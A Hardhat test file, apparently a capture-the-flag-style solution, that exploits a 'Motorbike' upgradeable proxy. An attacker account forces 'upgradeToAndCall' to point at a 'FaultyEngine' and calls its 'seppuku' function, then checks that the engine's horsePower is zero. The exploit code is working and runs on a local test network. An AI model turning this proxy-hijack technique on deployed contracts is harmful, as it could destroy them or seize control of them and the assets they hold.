import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

describe('Motorbike', () => {
  let owner: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let attacker: SignerWithAddress;
  let motorbikeContract: Contract;
  let engineContract: Contract;
  before(async () => {
    [owner, user1, user2, attacker] = await ethers.getSigners();
    const [EngineFactory, MotorbikeFactory] = await Promise.all([
      ethers.getContractFactory('Engine'),
      ethers.getContractFactory('Motorbike'),
    ]);

    engineContract = await EngineFactory.connect(owner).deploy();
    await engineContract.deployed();

    motorbikeContract = await MotorbikeFactory.connect(owner).deploy(
      engineContract.address
    );
    await motorbikeContract.deployed();
  });

  async function getEngineHorsePower(): Promise<number> {
    const iface = new ethers.utils.Interface([
      'function horsePower() returns (uint256)',
    ]);
    const data = iface.encodeFunctionData('horsePower');

    let horsePower: any = await attacker.call({
      to: motorbikeContract.address,
      data,
    });
    horsePower = BigNumber.from(horsePower).toNumber();

    return horsePower;
  }

  it('attack', async () => {
    // Deploy a faulty engine
    const FaultyEngineFactory = await ethers.getContractFactory('FaultyEngine');
    const faultyEngine = await FaultyEngineFactory.deploy();
    await faultyEngine.deployed();

    const iface = new ethers.utils.Interface([
      'function upgradeToAndCall(address, bytes)',
    ]);
    const data = iface.encodeFunctionData('upgradeToAndCall', [
      faultyEngine.address,
      faultyEngine.interface.encodeFunctionData('seppuku'),
    ]);

    // Force an upgrade
    const tx = await attacker.sendTransaction({
      to: motorbikeContract.address,
      data,
    });
    await tx.wait();

    const horsePower = await getEngineHorsePower();
    expect(horsePower).to.equal(0);
  });
});
